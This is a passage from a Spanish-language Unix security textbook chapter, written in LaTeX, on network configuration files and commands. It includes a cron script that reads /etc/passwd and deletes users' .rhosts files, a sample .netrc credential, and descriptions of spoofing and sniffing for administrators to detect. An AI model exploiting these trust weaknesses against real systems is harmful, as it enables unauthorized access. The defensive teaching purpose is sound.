@@ -1,0 +1,842 @@
+\chapter{El sistema de red}
+\section{Introducci\'on}
+Por sistema de red de un equipo Unix se entiende el conjunto de software que
+posibilita la interconexi\'on entre diferentes m\'aquinas. Este software est\'a 
+dividido en dos espacios: por un lado, tenemos el soporte de red dentro del 
+{\it kernel} del sistema operativo, encargado de implementar las tareas de
+m\'as bajo nivel necesarias para la comunicaci\'on entre sistemas, como la
+pila de protocolos {\sc tcp/ip} o los controladores de tarjetas de red; por 
+otro, ya en el espacio de
+usuario, tenemos el conjunto de programas y ficheros utilizados para configurar 
+par\'ametros del sistema relacionados con la red, como la direcci\'on {\sc IP}, 
+las tablas de rutado, o el comportamiento de una m\'aquina ante solicitudes de 
+servicio desde otros equipos conectados l\'ogicamente a ella.\\
+\\En este trabajo vamos a hablar exclusivamente de este {\it software} de 
+usuario (tanto utilidades como ficheros) que de una u otra forma puede afectar 
+a la seguridad global del equipo. Se trata de una peque\~na -- muy peque\~na -- 
+introducci\'on a esta parte del sistema de red en Unix, sin entrar en {\bf
+ning\'un} detalle; para temas m\'as concretos, como la configuraci\'on del 
+soporte de red en n\'ucleo, la configuraci\'on de interfaces de red, servicios 
+de nombres o la configuraci\'on de las tablas de rutado, se puede consultar 
+\cite{kn:fri95}, \cite{kn:hun92}, \cite{kn:nem89} o, en el caso de m\'aquinas 
+Linux, \cite{kn:kir95}.
+\section{Algunos ficheros importantes}
+\subsection{El fichero {\tt /etc/hosts}}
+Este fichero se utiliza para obtener una relaci\'on entre un nombre de m\'aquina
+y una direcci\'on {\sc ip}: en cada l\'{\i}nea de {\tt /etc/hosts} se 
+especifica una direcci\'on {\sc ip} y
+los nombres de m\'aquina que le corresponden, de forma que un usuario no tenga
+que recordar direcciones sino nombres de {\it hosts}. Habitualmente se suelen
+incluir las direcciones, nombres y aliases de todos los equipos conectados a
+la red local, de forma que para comunicaci\'on dentro de la red no se tenga que
+recurrir a DNS a la hora de resolver un nombre de m\'aquina. El formato de
+una l\'{\i}nea de este fichero puede ser el siguiente:
+\tt
+\begin{quote}
+\begin{verbatim}
+158.42.2.1       pleione pleione.cc.upv.es pleione.upv.es
+\end{verbatim}
+\end{quote}
+\rm
+Esta l\'{\i}nea indica que ser\'a equivalente utilizar la direcci\'on 
+{\tt 158.42.2.1}, el nombre de m\'aquina {\tt pleione}, o los {\it aliases}
+{\tt pleione.cc.upv.es} y {\tt pleione.upv.es} cuando queramos comunicarnos con 
+este servidor:
+\tt
+\begin{quote}
+\begin{verbatim}
+luisa:~# telnet pleione
+Trying 158.42.2.1...
+Connected to pleione.cc.upv.es
+Escape character is '^]'.
+Connection closed by foreign host.
+luisa:~# telnet 158.42.2.1
+Trying 158.42.2.1...
+Connected to pleione.cc.upv.es
+Escape character is '^]'.
+Connection closed by foreign host.
+luisa:~#
+\end{verbatim}
+\end{quote}
+\rm
+\subsection{El archivo {\tt /etc/ethers}}
+De la misma forma que en {\tt /etc/hosts} se establec\'{\i}a una correspondencia
+entre nombres de m\'aquina y sus direcciones {\sc ip}, en este fichero se
+establece una correspondencia entre nombres de m\'aquina y direcciones {\it
+ethernet}, en un formato muy similar al archivo anterior:
+\tt
+\begin{quote}
+\begin{verbatim}
+00:20:18:72:c7:95      pleione.cc.upv.es
+\end{verbatim}
+\end{quote}
+\rm
+En la actualidad el archivo {\tt /etc/ethers} no se suele encontrar 
+(aunque para el sistema sigue conservando su funcionalidad, es decir, si 
+existe se tiene en cuenta) en casi ninguna m\'aquina Unix, ya que las 
+direcciones hardware se obtienen por {\sc arp}. No obstante, a\'un resulta 
+\'util en determinados casos, por ejemplo en cortafuegos con tarjetas {\it
+quad} donde todas las interfaces de la tarjeta tienen la misma direcci\'on
+MAC.
+\subsection{El fichero {\tt /etc/networks}}
+Este fichero, cada vez m\'as en desuso, permite asignar un nombre simb\'olico
+a las redes, de una forma similar a lo que {\tt /etc/hosts} hace con las
+m\'aquinas. En cada l\'{\i}nea del fichero se especifica un nombre de red, su
+direcci\'on, y sus {\it aliases}:
+\begin{quote}
+\begin{verbatim}
+luisa:~# cat /etc/networks
+loopback        127.0.0.0
+localnet        192.168.0.0
+luisa:~#
+\end{verbatim}
+\end{quote}
+El uso de este fichero es casi exclusivo del arranque del sistema, cuando a\'un
+no se dispone de servidores de nombres; en la operaci\'on habitual del sistema
+no se suele utilizar, ya que ha sido desplazado por {\sc dns}.
+\subsection{El fichero {\tt /etc/services}}
+En cada l\'{\i}nea de este fichero se especifican el nombre, n\'umero de puerto,
+protocolo utilizado y aliases de todos los servicios de red existentes (o, si
+no de todos los existentes, de un subconjunto lo suficientemente amplio para que
+ciertos programas de red funcionen correctamente). Por ejemplo, para especificar
+que el servicio de {\tt smtp} utilizar\'a el puerto 25, el protocolo {\sc
+tcp} y que un {\it alias} para \'el es {\tt mail}, existir\'a una l\'{\i}nea 
+similar a la siguiente:
+\tt
+\begin{quote}
+\begin{verbatim}
+smtp        25/tcp   mail
+\end{verbatim}
+\end{quote}
+\rm
+El fichero {\tt /etc/services} es utilizado por los servidores y por los 
+clientes para obtener el n\'umero de puerto en el que deben escuchar o al que
+deben enviar peticiones, de forma que se pueda cambiar (aunque no es lo 
+habitual) un n\'umero de puerto sin afectar a las aplicaciones; de esta forma,
+podemos utilizar el nombre del servicio en un programa y la funci\'on {\tt
+getservicebyname()} en lugar de utilizar el n\'umero del puerto:
+\begin{quote}
+\begin{verbatim}
+luisa:~# telnet anita 25
+Trying 192.168.0.3...
+Connected to anita.
+Escape character is '^]'.
+220 anita ESMTP Sendmail 8.9.1b+Sun/8.9.1; Sun, 31 Oct 1999 06:43:06 GMT
+quit
+221 anita closing connection
+Connection closed by foreign host.
+luisa:~# telnet anita smtp
+Trying 192.168.0.3...
+Connected to anita.
+Escape character is '^]'.
+220 anita ESMTP Sendmail 8.9.1b+Sun/8.9.1; Sun, 31 Oct 1999 06:43:20 GMT
+quit
+221 anita closing connection
+Connection closed by foreign host.
+luisa:~#
+\end{verbatim}
+\end{quote}
+Este fichero {\bf NO} se utiliza para habilitar o deshabilitar servicios, sino 
+como hemos dicho, simplemente para obtener n\'umeros de puerto a partir de 
+nombres de servicio y viceversa.
+\subsection{El fichero {\tt /etc/protocols}}
+El sistema de red en Unix utiliza un n\'umero especial, denominado n\'umero de
+protocolo, para identificar el protocolo de transporte espec\'{\i}fico que la
+m\'aquina recibe; esto permite al {\it software} de red decodificar 
+correctamente la informaci\'on recibida. En el archivo {\tt /etc/protocols}
+se identifican todos los protocolos de transporte reconocidos junto a su 
+n\'umero de protocolo y sus {\it aliases}:
+\begin{quote}
+\begin{verbatim}
+luisa:~# cat /etc/protocols
+ip      0       IP      # internet protocol, pseudo protocol number
+icmp    1       ICMP    # internet control message protocol
+igmp    2       IGMP    # internet group multicast protocol
+ggp     3       GGP     # gateway-gateway protocol
+tcp     6       TCP     # transmission control protocol
+pup     12      PUP     # PARC universal packet protocol
+udp     17      UDP     # user datagram protocol
+idp     22      IDP     # WhatsThis?
+raw     255     RAW     # RAW IP interface
+luisa:~#
+\end{verbatim}
+\end{quote}
+No es usual -- ni recomendable -- que el administrador modifique este fichero;
+es el {\it software} de red el que lo va actualizando al ser instalado en la
+m\'aquina
+\subsection{El fichero {\tt /etc/hosts.equiv}}
+En este fichero se indican, una en cada l\'{\i}nea, las m\'aquinas confiables.
+>Qu\'e significa {\it confiables}? B\'asicamente que confiamos en su seguridad
+tanto como en la nuestra, por lo que para facilitar la compartici\'on de 
+recursos, no se van a pedir contrase\~nas a los usuarios que quieran conectar
+desde estas m\'aquinas con el mismo {\it login}, utilizando las \'ordenes 
+{\sc bsd} {\tt r$\ast$} ({\tt rlogin, rsh, rcp}\ldots). Por ejemplo, si en el
+fichero {\tt /etc/hosts.equiv} del servidor {\tt maquina1} hay una entrada 
+para el nombre
+de {\it host} {\tt maquina2}, cualquier usuario\footnote{Excepto el {\it 
+root}.} de este sistema puede ejecutar una orden como la siguiente para 
+conectar a {\tt maquina1} {\bf <sin necesidad de ninguna clave!}:
+\begin{quote}
+\begin{verbatim}
+maquina2:~$ rlogin maquina1
+Last login: Sun Oct 31 08:27:54 from localhost
+Sun Microsystems Inc.   SunOS 5.7       Generic October 1998
+maquina1:~$ 
+\end{verbatim}
+\end{quote}
+Obviamente, esto supone un gran problema de seguridad, por lo que lo m\'as 
+recomendable es que el fichero {\tt /etc/hosts.equiv} est\'e vac\'{\i}o o no 
+exista. De la misma forma, los usuarios pueden crear ficheros {\tt 
+\$HOME/.rhosts} para establecer un mecanismo de confiabilidad bastante similar
+al de {\tt /etc/hosts.equiv}; es importante para la seguridad de nuestro 
+sistema el controlar la existencia y el contenido de estos archivos {\tt 
+.rhosts}. Por ejemplo, podemos aprovechar las facilidades de planificaci\'on de
+tareas de Unix para, cada cierto tiempo, chequear los directorios {\tt \$HOME}
+de los usuarios en busca de estos ficheros, elimin\'andolos si los 
+encontramos. Un {\it shellscript} que hace esto puede ser el siguiente:
+\label{scriptrhosts}
+\begin{quote}
+\begin{verbatim}
+#!/bin/sh
+for i in `cat /etc/passwd |awk -F: '{print $6}'`; do
+    cd $i
+    if [ -f .rhosts ]; then
+        echo "$i/.rhosts detectado"|mail -s "rhosts" root
+        rm -f $i/.rhosts
+    fi
+done
+\end{verbatim}
+\end{quote}
+Este programa env\'{\i}a un correo al {\it root} en caso de encontrar un 
+fichero {\tt .rhosts}, y lo elimina; podemos planificarlo mediante {\tt cron}
+para que se ejecute, por ejemplo, cada cinco minutos (la forma de planificarlo
+depende del clon de Unix en el que trabajemos, por lo que se recomienda 
+consultar la p\'agina del manual de {\tt cron} o {\tt crond}).
+\subsection{El fichero {\tt .netrc}}
+El mecanismo de autenticaci\'on que acabamos de ver s\'olo funciona con las
+\'ordenes {\tt r*} de Unix {\sc bsd}; la conexi\'on v\'{\i}a {\tt ftp} 
+seguir\'a solicitando un nombre de usuario y una clave para acceder a sistemas
+remotos. No obstante, existe una forma de automatizar {\tt ftp} para que no
+solicite estos datos, y es mediante el uso de un archivo situado en el 
+directorio {\it \$HOME} de cada usuario (en la m\'aquina desde donde se invoca a
+{\tt ftp}, no en la servidora) y llamado {\tt .netrc}. En este fichero
+se pueden especificar, en texto claro, nombres de m\'aquina, nombres de usuario
+y contrase\~nas de sistemas remotos, de forma que al conectar a ellos la
+transferencia de estos datos se realiza autom\'aticamente, sin ninguna 
+interacci\'on con el usuario. Por ejemplo, imaginemos que el usuario {\tt 
+`root'} del sistema {\tt luisa} conecta habitualmente a {\tt rosita} por {\tt 
+ftp}, con nombre de usuario {\tt `toni'}; en su {\it \$HOME} de {\tt luisa}
+puede crear un fichero {\tt .netrc} como el siguiente:
+\begin{quote}
+\begin{verbatim}
+luisa:~# cat $HOME/.netrc
+machine rosita
+login toni
+password h/l0&54
+luisa:~#
+\end{verbatim}
+\end{quote}
+Si este archivo existe, cuando conecte al sistema remoto no se le solicitar\'an
+ning\'un nombre de usuario ni contrase\~na:
+\begin{quote}
+\begin{verbatim}
+luisa:~# ftp rosita
+Connected to rosita.
+220 rosita FTP server (Version wu-2.6.0(1) Thu Oct 21 12:27:00 EDT 1999) ready.
+331 Password required for toni.
+230 User toni logged in.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp>
+\end{verbatim}
+\end{quote}
+La existencia de ficheros {\tt .netrc} en los {\it \$HOME} de los usuarios 
+se puede convertir en un grave problema de seguridad: si un atacante 
+consigue leer nuestro fichero {\tt .netrc}, autom\'aticamente obtiene nuestro
+nombre de usuario y nuestra clave en un sistema remoto. Por tanto, no es de
+extra\~nar que para que el mecanismo funcione correctamente, este fichero s\'olo
+puede ser le\'{\i}do por su propietario; si no es as\'{\i}, no se permitir\'a
+el acceso al sistema remoto (aunque los datos de {\tt .netrc} sean correctos):
+\begin{quote}
+\begin{verbatim}
+luisa:~# ftp rosita
+Connected to rosita.
+220 rosita FTP server (Version wu-2.6.0(1) Thu Oct 21 12:27:00 EDT 1999) ready.
+Error - .netrc file not correct permissions.
+Remove password or correct mode (should be 600).
+ftp>
+\end{verbatim}
+\end{quote}
+Existe una diferencia abismal entre el uso de {\tt .rhosts} y el de 
+{\tt .netrc}; en el primer caso al menos conseguimos que nuestra clave no se
+env\'{\i}e a trav\'es de la red, pero mediante {\tt .netrc} lo \'unico que
+conseguimos es no tener que teclear la clave y el {\it login} 
+expl\'{\i}citamente: se env\'{\i}an de forma autom\'atica. Adem\'as de esto,
+si alguien consigue privilegios de administrador en la 
+m\'aquina cliente, podr\'a leer los posibles archivos {\tt .netrc} que sus
+usuarios posean; por tanto, este mecanismo s\'olo se ha de utilizar para
+conexiones a sistemas remotos como usuario an\'onimo ({\tt anonymous} o {\tt
+ftp}). Quiz\'as nos convenga rastrear peri\'odicamente los directorios de
+conexi\'on de nuestros usuarios en busca de archivos {\tt .netrc}, por ejemplo
+mediante un {\it shellscript} muy similar al que hemos visto para buscar
+ficheros {\tt .rhosts}.
+\subsection{El fichero {\tt /etc/inetd.conf}}
+Este fichero es el utilizado por el demonio {\tt inetd}, conocido como el
+superservidor de red. El demonio {\tt inetd} es el encargado de ofrecer la
+mayor\'{\i}a de servicios de nuestro equipo hacia el resto de m\'aquinas, y
+por tanto debemos cuidar mucho su correcta configuraci\'on. Posteriormente 
+hablaremos de c\'omo restringir servicios, tanto ofrecidos por este demonio como
+servidos independientemente.\\
+\\Cada l\'{\i}nea (excepto las que comienzar por {\tt `\#'}, que son tratadas
+como comentarios) del archivo {\tt /etc/inetd.conf} le indica a {\tt inetd} 
+c\'omo se ha de comportar cuando recibe una petici\'on en cierto puerto; en cada
+una de ellas existen al menos seis campos (en algunos clones de Unix pueden ser 
+m\'as, como se explica en \cite{kn:siy95}), cuyo significado es el 
+siguiente:
+\begin{itemize}
+\item Servicio\\
+Este campo indica el nombre del servicio asociado a la l\'{\i}nea 
+correspondiente de {\tt\\ /etc/inetd.conf}; el nombre ha de existir en 
+{\tt /etc/services} para ser considerado correcto, o en {\tt /etc/rpc} si se
+trata de servicios basados en el RPC ({\it Remote Procedure Call}) de Sun
+Microsystems. En este \'ultimo caso se ha de acompa\~nar el nombre del servicio
+con el n\'umero de versi\'on RPC, separando ambos con el car\'acter {\tt `/'}.
+\item {\it Socket}\\
+Aqu\'{\i} se indica el tipo de {\it socket} asociado a la conexi\'on. Aunque
+dependiendo del clon de Unix utilizado existen una serie de identificadores 
+v\'alidos, lo normal es que asociado al protocolo {\sc tcp} se utilicen 
+{\it sockets} de tipo {\tt stream}, mientras que si el protocolo es {\sc udp} 
+el tipo del {\it socket} sea {\tt dgram} (datagrama).
+\item Protocolo\\
+El protocolo debe ser un protocolo definido en {\tt /etc/protocols}, 
+generalmente {\sc tcp} o {\sc udp}. Si se trata de servicios RPC, de nuevo hay
+que indicarlo utilizando {\tt rpc} antes del nombre del protocolo, separado
+de \'el por el car\'acter {\tt `/'} al igual que suced\'{\i}a con el nombre; por
+ejemplo, en este caso podr\'{\i}amos tener protocolos como {\tt rpc/tcp} o {\tt
+rpc/udp}.
+\item Concurrencia\\
+El campo de concurrencia s\'olamente es aplicable a {\it sockets} de tipo
+datagrama ({\tt dgram}); el resto de tipos han de contener una entrada {\tt
+nowait} en este campo. Si el servidor que ha de atender la petici\'on es
+multihilo (es decir, puede anteder varias peticiones simult\'aneamente), hemos
+de indicarle al sistema de red que libere el {\it socket} asociado a una 
+conexi\'on de forma que {\tt inetd} pueda seguir aceptando peticiones en dicho
+{\it socket}; en este caso utilizaremos la opci\'on {\tt nowait}. Si por el
+contrario se trata de un servidor unihilo (acepta peticiones de forma 
+secuencial, hasta que no finaliza con una no puede escuchar la siguiente) 
+especificaremos {\tt wait}.\\
+\\Especificar correctamente el modelo de concurrencia a seguir en un determinado
+servicio es importante para nuestra seguridad, especialmente para prevenir
+ataques de negaci\'on de servicio ({\it DoS}). Si especificamos {\tt wait},
+{\tt inetd} no podr\'a atender una petici\'on hasta que no finalice el servicio
+de la actual, por lo que si este servicio es muy costoso la segunda petici\'on 
+no ser\'a servida en un tiempo razonable (o incluso nunca, si {\tt inetd} se
+queda bloqueado por cualquier motivo). Si por el contrario especificamos {\tt
+nowait}, el n\'umero de conexiones simult\'aneas quiz\'as llegue a ser lo
+suficientemente grande como para degradar las prestaciones del sistema, lo que
+por supuesto no es conveniente para nosotros. Para evitar ataques de este
+estilo, la mayor\'{\i}a de sistemas Unix actuales permiten especificar (junto a
+{\tt wait} o {\tt nowait}, separado de \'el por un punto) el 
+n\'umero m\'aximo de peticiones a un servicio durante un intervalo de tiempo
+(generalmente un minuto), de forma que si este n\'umero se sobrepasa {\tt inetd}
+asume que alguien est\'a intentando una negaci\'on de servicio contra \'el, 
+por lo que deja de ofrecer ese servicio durante cierto tiempo (algunos clones
+de Unix incluso paran {\tt inetd}, es conveniente consultar la documentaci\'on
+en cada caso). Como evidentemente esto tambi\'en es una negaci\'on de
+servicio, algo muy com\'un entre administradores es aprovechar las facilidades
+de planificaci\'on de Unix para enviar cada poco tiempo la se\~nal {\sc sighup}
+al demonio {\tt inetd}, de forma que este relea su fichero de configuraci\'on 
+y vuelva a funcionar normalmente. Por ejemplo, para conseguir esto podemos
+a\~nadir a nuestro fichero {\tt crontab} una l\'{\i}nea como la siguiente:
+\begin{quote}
+\begin{verbatim}
+00,10,20,30,40,50 * * * *           pkill -HUP inetd
+\end{verbatim}
+\end{quote}
+Con esto conseguimos que {\tt inetd} se reconfigure cada diez minutos (el
+equivalente a {\tt pkill} en ciertos Unices es {\tt killall}, pero es 
+recomendable consultar el manual para asegurarse de lo que esta orden provoca).
+\item Usuario\\
+En este campo se ha de indicar el nombre de usuario bajo cuya identidad se ha
+de ejecutar el programa que atiende cada servicio; esto es as\'{\i} para poder
+lanzar servidores sin que posean los privilegios del {\it root}, con lo que
+un posible error en su funcionamiento no tenga consecuencias excesivamente
+graves. Para
+el grupo, se asume el grupo primario del usuario especificado, aunque se 
+puede indicar un grupo diferente indic\'andolo junto al nombre, separado de
+\'este por un punto.
+\item Programa\\
+Por \'ultimo, en cada l\'{\i}nea de {\tt /etc/inetd.conf} hemos de indicar la
+ruta del programa encargado de servir cada petici\'on que {\tt inetd} recibe
+en un puerto determinado, junto a los argumentos de dicho programa. El servidor
+{\tt inetd} es capaz de ofrecer peque\~nos servicios basado en {\sc tcp} por 
+s\'{\i} mismo, sin necesidad de invocar a otros programas; ejemplos de este 
+tipo de servicios son {\tt time}, {\tt echo} o {\tt chargen}. En este caso, el
+valor de este campo ha de ser {\tt internal}.
+\end{itemize}
+De esta forma, si en {\tt /etc/inetd.conf} tenemos una l\'{\i}nea como
+\begin{quote}
+\begin{verbatim}
+telnet  stream  tcp     nowait  root    /usr/sbin/in.telnetd
+\end{verbatim}
+\end{quote}
+entonces {\tt inetd} sabe que cuando reciba una petici\'on al puerto {\tt 
+telnet} ha de abrir un {\it socket} tipo {\tt stream} (el habitual para el
+protocolo {\sc tcp}) y ejecutar {\tt fork()} y {\tt exec()} del programa\\
+{\tt /usr/sbin/in.telnetd}, bajo la identidad de {\tt root}.
+\section{Algunas \'ordenes importantes}
+\subsection{La orden {\tt ifconfig}}
+La orden {\tt ifconfig} se utiliza para configurar correctamente los interfaces 
+de red de nuestro sistema Unix; habitualmente con {\tt ifconfig} se indican 
+par\'ametros como la direcci\'on {\sc ip} de la m\'aquina, la m\'ascara de la 
+red local o la direcci\'on de {\it broadcast}. Si como par\'ametros se recibe
+\'unicamente un nombre de dispositivo, {\tt ifconfig} nos muestra su
+configuraci\'on en este momento:
+\tt
+\begin{quote}
+\begin{verbatim}
+anita:/# ifconfig nei0
+nei0: flags=863<UP,BROADCAST,NOTRAILERS,RUNNING,MULTICAST> mtu 1500
+        inet 192.168.0.3 netmask ffffff00 broadcast 192.168.0.255
+        ether 0:20:18:72:45:ad 
+anita:/# 
+\end{verbatim}
+\end{quote}
+\rm
+Ya hemos dicho que aqu\'{\i} no vamos a hablar de la configuraci\'on de estos
+dispositivos, sino de sus consideraciones de seguridad. Podemos utilizar 
+{\tt ifconfig} para detectar un funcionamiento an\'omalo de la tarjeta de
+red; este `funcionamiento an\'omalo' suele ser la causa (siempre en cuanto a
+seguridad se trata) de uno de los tres siguientes problemas:
+\begin{itemize}
+\item Direcci\'on {\sc ip} incorrecta.\\
+Es posible que alguien est\'e realizando un ataque de tipo {\it IP Spoofing}
+utilizando nuestro sistema: si utilizamos la direcci\'on {\sc ip} de otro 
+equipo, las peticiones que ir\'{\i}an a \'el van a llegar a nosotros\footnote{Si
+el otro equipo no est\'a activo; si lo est\'a, ninguno funcionar\'a 
+correctamente.}. Estamos suplantando su identidad, hecho que un atacante puede
+aprovechar para capturar todo tipo de informaci\'on (desde claves hasta 
+correo electr\'onico).
+\item Direcci\'on {\sc mac} incorrecta.\\
+Esto puede denotar un ataque similar al anterior, pero m\'as elaborado: estamos
+suplantando la identidad de otro equipo no s\'olo a nivel de {\sc ip}, sino a
+nivel de direcci\'on {\sc mac}. Cuando esto sucede, casi con toda seguridad
+se acompa\~na de un {\it IP Spoof} para conseguir una suplantaci\'on que no sea
+tan f\'acil de detectar como el {\it IP Spoof} a secas.
+\item Tarjeta en modo promiscuo.\\
+Alguien ha instalado un {\it sniffer} en nuestro sistema y ha puesto la
+tarjeta de red en modo promiscuo, para capturar todas las tramas que \'esta
+`ve'. Es un m\'etodo muy utilizado por atacantes que han conseguido privilegio 
+de superusuario en la m\'aquina (es necesario ser {\it root} para situar a la
+tarjeta en este modo de operaci\'on) y se est\'a dedicando a analizar el 
+tr\'afico de la red en busca de {\it logins} y claves de usuarios de otros
+equipos.
+\end{itemize}
+\subsection{La orden {\tt route}}
+Este comando se utiliza para configurar las tablas de rutado del n\'ucleo de
+nuestro sistema. Generalmente en todo equipo de una red local tenemos al menos
+tres rutas: la de {\it loopback}, utilizando el dispositivo de bucle interno
+({\tt lo, lo0\ldots}), la de red local ({\it localnet}), que utiliza la tarjeta 
+de red para comunicarse con equipos dentro del mismo segmento de red, y una 
+{\it default} que tambi\'en utiliza la tarjeta para enviar a un {\it router} o
+{\it gateway} paquetes que no son para equipos de nuestro segmento. Si no se
+especifica ning\'un par\'ametro, {\tt route} muestra la configuraci\'on actual 
+de las tablas de rutado\footnote{En algunos Unix, esto se consigue con la
+orden {\tt netstat -r}.}:
+\tt
+\begin{quote}
+\begin{verbatim}
+andercheran:~# route
+Kernel routing table
+Destination   Gateway          Genmask        Flags  MSS    Window  Use Iface
+localnet      *                255.255.0.0    U      1500   0       16  eth0
+loopback      *                255.0.0.0      U      3584   0       89  lo
+default       atlas.cc.upv.es  *              UG     1500   0       66  eth0
+andercheran:~# 
+\end{verbatim}
+\end{quote}
+\rm
+Si {\tt route} nos muestra una configuraci\'on sospechosa (esto es, las tablas
+no son las que en el sistema hemos establecido como administradores, aunque
+todo funcione correctamente) esto puede denotar un ataque de simulaci\'on: 
+alguien ha desviado el tr\'afico por un equipo que se comporta de la misma
+forma que se comportar\'{\i}a el original, pero que seguramente analiza toda
+la informaci\'on que pasa por \'el. Hemos de recalcar que esto suele ser 
+transparente al buen funcionamiento del equipo (no notamos ni p\'erdida de
+paquetes, ni retardos excesivos, ni nada sospechoso), y que adem\'as el 
+atacante puede modificar los ficheros de arranque del sistema para, en caso de
+reinicio de la m\'aquina, volver a tener configuradas las rutas a su gusto;
+estos ficheros suelen del tipo {\tt /etc/rc.d/rc.inet1} o {\tt 
+/etc/rc?.d/S$\ast$inet}.\\
+\\Tambi\'en es posible que alguien est\'e utilizando alg\'un elemento utilizado
+en la conexi\'on entre nuestro sistema y otro (un {\it router}, una 
+pasarela\ldots) para amenazar la integridad de nuestro equipo; si queremos 
+comprobar el camino que siguen los paquetes desde que salen de la m\'aquina 
+hasta que llegan al destino, podemos utilizar la orden
+{\tt traceroute}. Sin embargo, este tipo de ataques es mucho m\'as dif\'{\i}cil
+de detectar, y casi la \'unica herramienta asequible para evitarlos es la
+criptograf\'{\i}a.
+\subsection{La orden {\tt netstat}}
+Esta orden se utiliza para visualizar el estado de diversas estructuras de datos
+del sistema de red, desde las tablas de rutado hasta el estado de todas las
+conexiones a y desde nuestra m\'aquina, pasando por las tablas {\sc arp}, en 
+funci\'on de los par\'ametros que reciba.\\
+\\En temas referentes a la seguridad, {\tt netstat} se suele utilizar, aparte de
+para mostrar las tablas de rutado de ciertos sistemas (con la opci\'on {\tt -r},
+como hemos visto antes), para mostrar los puertos abiertos que escuchan 
+peticiones de red y para visualizar conexiones a nuestro equipo (o desde \'el)
+que puedan salirse de lo habitual. Veamos un ejemplo de informaci\'on mostrada
+por {\tt netstat}:
+\tt
+\begin{small}
+\begin{quote}
+\begin{verbatim}
+anita:/# netstat -P tcp -f inet -a
+TCP
+   Local Address        Remote Address    Swind Send-Q Rwind Recv-Q  State
+-------------------- -------------------- ----- ------ ----- ------ -------
+      *.*                  *.*                0      0     0      0 IDLE
+      *.sunrpc             *.*                0      0     0      0 LISTEN
+      *.*                  *.*                0      0     0      0 IDLE
+      *.32771              *.*                0      0     0      0 LISTEN
+      *.ftp                *.*                0      0     0      0 LISTEN
+      *.telnet             *.*                0      0     0      0 LISTEN
+      *.finger             *.*                0      0     0      0 LISTEN
+      *.dtspc              *.*                0      0     0      0 LISTEN
+      *.lockd              *.*                0      0     0      0 LISTEN
+      *.smtp               *.*                0      0     0      0 LISTEN
+      *.8888               *.*                0      0     0      0 LISTEN
+      *.32772              *.*                0      0     0      0 LISTEN
+      *.32773              *.*                0      0     0      0 LISTEN
+      *.printer            *.*                0      0     0      0 LISTEN
+      *.listen             *.*                0      0     0      0 LISTEN
+      *.32774              *.*                0      0     0      0 LISTEN
+      *.*                  *.*                0      0     0      0 IDLE
+      *.6000               *.*                0      0     0      0 LISTEN
+      *.32775              *.*                0      0     0      0 LISTEN
+localhost.32777      localhost.32775      32768      0 32768      0 ESTABLISHED
+localhost.32775      localhost.32777      32768      0 32768      0 ESTABLISHED
+localhost.32780      localhost.32779      32768      0 32768      0 ESTABLISHED
+localhost.32779      localhost.32780      32768      0 32768      0 ESTABLISHED
+localhost.32783      localhost.32775      32768      0 32768      0 ESTABLISHED
+localhost.32775      localhost.32783      32768      0 32768      0 ESTABLISHED
+localhost.32786      localhost.32785      32768      0 32768      0 ESTABLISHED
+localhost.32785      localhost.32786      32768      0 32768      0 ESTABLISHED
+localhost.32789      localhost.32775      32768      0 32768      0 ESTABLISHED
+localhost.32775      localhost.32789      32768      0 32768      0 ESTABLISHED
+localhost.32792      localhost.32791      32768      0 32768      0 ESTABLISHED
+localhost.32791      localhost.32792      32768      0 32768      0 ESTABLISHED
+localhost.32810      localhost.6000       32768      0 32768      0 ESTABLISHED
+localhost.6000       localhost.32810      32768      0 32768      0 ESTABLISHED
+anita.telnet         luisa.2039           16060      0 10136      0 ESTABLISHED
+anita.telnet         bgates.microsoft.com.1068 15928 0 10136      0 ESTABLISHED
+localhost.32879      localhost.32775      32768      0 32768      0 TIME_WAIT
+      *.*                  *.*                0      0     0      0 IDLE
+anita:/# 
+\end{verbatim}
+\end{quote}
+\end{small}
+\rm
+Por un lado, en este caso vemos que hay bastantes puertos abiertos, esto es, 
+escuchando
+peticiones: todos los que presentan un estado {\sc listen}, como {\tt telnet},
+{\tt finger} o {\tt smtp} (si es un servicio con nombre en {\tt /etc/services}
+se imprimir\'a este nombre, y si no simplemente el n\'umero de puerto).
+Cualquiera puede conectar a este servicio (como veremos en el siguiente punto)
+y, si no lo evitamos mediante {\it TCP Wrappers}, utilizarlo para enviarle 
+peticiones.\\
+\\Aparte de estos puertos a la espera de conexiones, vemos otro gran n\'umero de
+conexiones establecida entre nuestro sistema y otros (como antes hemos dicho,
+desde nuestro equipo o hacia \'el); casi todas las establecidas (estado {\sc
+established}) son de nuestra m\'aquina contra ella misma, lo que a priori no
+implica consecuencias de seguridad. Otra de ellas es desde un equipo de la
+red local contra nuestro sistema, lo que tambi\'en es bastante normal y no
+debe hacernos sospechar nada\footnote{Seguramente, uno de nuestros usuarios
+estar\'a trabajando desde ese ordenador, aunque tambi\'en podr\'{\i}a tratarse
+de un atacante\ldots}; sin embargo, hay una conexi\'on que s\'{\i} puede 
+indicar que alguien ha accedido a nuestro sistema de forma no autorizada: si
+nos fijamos, alguien conecta por {\tt telnet} desde la m\'aquina {\tt 
+bgates.microsoft.com}. Es raro que tengamos a un usuario all\'{\i}, por lo 
+que deber\'{\i}amos monitorizar esta conexi\'on y las actividades que esta 
+persona realice; es muy probable que se trate de alguien que ha aprovechado la
+inseguridad de ciertos sistemas para utilizarlos como plataforma de ataque 
+contra nuestros Unix.
+\subsection{La orden {\tt ping}}
+El comando {\tt ping} se utiliza generalmente para testear aspectos de la
+red, como comprobar que un sistema est\'a encendido y conectado; esto se 
+consigue enviando a dicha 
+m\'aquina paquetes {\sc icmp} (de tipo {\sc echo$\_$request}), tramas que 
+causar\'an que el n\'ucleo del sistema remoto responda con paquetes {\sc icmp},
+pero esta vez de tipo {\sc echo$\_$response}. Al recibirlos, se asume que 
+la m\'aquina est\'a encendida:
+\begin{quote} 
+\begin{verbatim} 
+anita:~# ping luisa
+luisa is alive
+anita:~#
+\end{verbatim} 
+\end{quote} 
+En otras variantes de Unix (el ejemplo anterior es sobre Solaris) la orden {\tt 
+ping} produce un resultado con m\'as informaci\'on:
+\begin{quote}
+\begin{verbatim}
+luisa:~# ping -c 1 anita
+PING anita (192.168.0.3): 56 data bytes
+64 bytes from 192.168.0.3: icmp_seq=0 ttl=255 time=0.2 ms
+
+--- luisa ping statistics ---
+1 packets transmitted, 1 packets received, 0% packet loss
+round-trip min/avg/max = 0.2/0.2/0.2 ms
+luisa:~#
+\end{verbatim}
+\end{quote}
+Aunque un simple {\tt ping} resulta inofensivo en la mayor\'{\i}a de 
